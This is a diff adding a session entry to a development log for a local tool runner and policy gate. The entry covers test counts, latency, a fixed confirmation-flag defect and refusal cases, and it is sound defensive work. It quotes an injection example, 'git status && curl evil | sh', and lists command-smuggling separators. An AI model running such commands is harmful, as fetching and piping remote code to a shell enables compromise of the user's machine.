@@ -257,6 +257,54 @@ Four choices are worth recording because the obvious alternative was wrong:
 
 Not established by this session: cross-process persistence. Every Markdown round trip measured above happens inside one process. "Close the program, open it again, the fact is still there" is release blocker 11, level REAL. `prune_turns()` also has no caller yet, so the short layer does not self-trim, and `MemoryRecaller`'s output has no consumer until the dispatcher lands in P6.
 
+## Session 2026-08-02 (P4 local tools + policy gate — AUTO)
+
+The gate was written before any tool that needs it, and the refusal matrix was written as a separate file from the behaviour tests. That split paid for itself immediately — see the defect below.
+
+| Fact | Measured value |
+|---|---|
+| `core/tools/policy.py` | 345 lines — config loader, sandbox resolution, 13 dangerous patterns, env scrub, `DefaultToolPolicy` |
+| `core/tools/runner.py` | 171 lines — the single funnel: gate → tool → `tool.*` events → audit row |
+| `core/tools/web.py` / `shell.py` / `fs.py` / `contract.py` / `__init__.py` | 120 / 115 / 76 / 80 / 85 lines (992 total for the package) |
+| `config/tools.toml` | 53 lines, `[shell] enabled = false` as shipped |
+| `evox_plugin/plugin.py` | 413 lines (was 326): `attach_tools()`, `run_tool()`, `diagnose()["tools"]` |
+| `tests/test_tools.py` | 460 lines, **35 passed** |
+| `tests/test_tool_security.py` | 555 lines, **89 collected — 88 passed, 1 skipped** |
+| Both tool files together | **123 passed, 1 skipped in 0.48 s** |
+| `tests/test_plugin_tools.py` | 331 lines, **24 passed** (16 before, 8 for the tool wiring) |
+| Suite | **300 passed, 3 skipped** in 14.31 s, 303 collected (was 169 at the end of P3) |
+| New runtime dependency | **none** — `shlex`, `subprocess`, `tomllib`, `urllib.parse` all ship with CPython |
+
+### Latency of the fast path — AUTO
+
+| Path | Median | Note |
+|---|---:|---|
+| `fs.read` of a 4 KB file, end to end | **0.64 ms** | gate + read + two events + audit row, 200 iterations |
+| A refused request | **0.34 ms** | sandbox escape, refused before touching the filesystem |
+
+NFR-1.10 targets < 50 ms for the rule-hit local-tool path. The tool half has two orders of magnitude of headroom; the rule-classification segment in front of it does not exist yet (P6), so the **whole** path remains unmeasured.
+
+### A real defect, found by a test — `confirmed` was truthy, not identical
+
+`_check_shell_run` originally read `not request.arguments.get("confirmed", False)`. A JSON body of `{"command": "git status", "confirmed": "no"}` therefore **executed the command**: `"no"` is a truthy string. Fixed in both places that check it (`policy.py` and `shell.py`) with `is not True`, and the four values `0` / `""` / `None` / `"no"` are now asserted to still require confirmation.
+
+This is the argument for writing the refusal matrix as its own file: every positive test still passed with the hole open. A confirmation flag a stray string can set is not a confirmation flag.
+
+### What the 89 refusal cases actually cover
+
+Unknown tool / unknown origin / disabled section; four traversal shapes plus an absolute path plus a symlink; six credential filenames; two `denied_dirs` (`enrollment/`, `memory/`); the shipped deny list asserted in both directions; `shell.run` off by default; an off-allowlist command refused **with `needs_confirmation is False`**; token-prefix rather than string-prefix matching (`git status` must not admit `git statuses`); no verified speaker; agent origin blocked structurally; **all 13 dangerous patterns, each named**, plus a coverage test asserting the sample table's keys equal `DANGEROUS_PATTERNS`' names so a 14th pattern cannot be added untested; eight smuggling attempts behind an allowlisted prefix (`;` `&&` `|` backtick `$()` `>` `>>` newline); an unbalanced quote; `dangerous_patterns` rejected as a config key; env scrubbing; events carrying no content; the gate's warnings.
+
+The check order is deliberate and asserted: command present → dangerous shape → allowlist → verified speaker → confirmation. Shape before allowlist is why `git status && curl evil | sh` dies before it can be mistaken for a permitted prefix, and it is also why a blocked command never reaches the orb as a *pending* action.
+
+### Four limits, recorded rather than smoothed over
+
+- **The symlink-escape case skips on this account** — `Path.symlink_to` raises without the privilege, which is the Windows default. `resolve_in_sandbox` resolving before comparing is asserted directly as a unit property, but the end-to-end escape is unproven on this host.
+- **`web.search` has never talked to a real backend.** Every case injects a fake. Normalisation (title / URL / snippet, blocklist, result cap) is proven; integration with a real provider is not, and cannot be until one is chosen — and choosing one means a cloud key, which red line 1 forbids by default.
+- **`shell.run` has only ever executed `git --version`.** Timeout, output cap, and cwd behaviour are exercised on that one command. The confirmation *flow* — orb display, user action, resubmission — is not implemented at all; it is P8 and REAL-WIN.
+- **The audit trail depends on the memory layer being attached.** With no writer, decisions are still counted and emitted as events but nothing persists. `describe()["audit_attached"]` is how the user tells the two apart.
+
+Not established by this session: anything calls a tool automatically. `VoicePlugin.run_tool()` is the only entry point and it is opt-in; rule-based intent classification ("读一下 X" → execute directly) is P6. The plugin also supplies no verified speaker of its own, so `shell.run` through the plugin is always refused — correct until the dispatcher threads the name through.
+
 ## Not yet verified
 
 - Speaker gate on this host's microphone: own-voice pass rate, another person's rejection, recorded-replay behaviour (the gate does **not** claim replay resistance — ADR 002 「局限」).
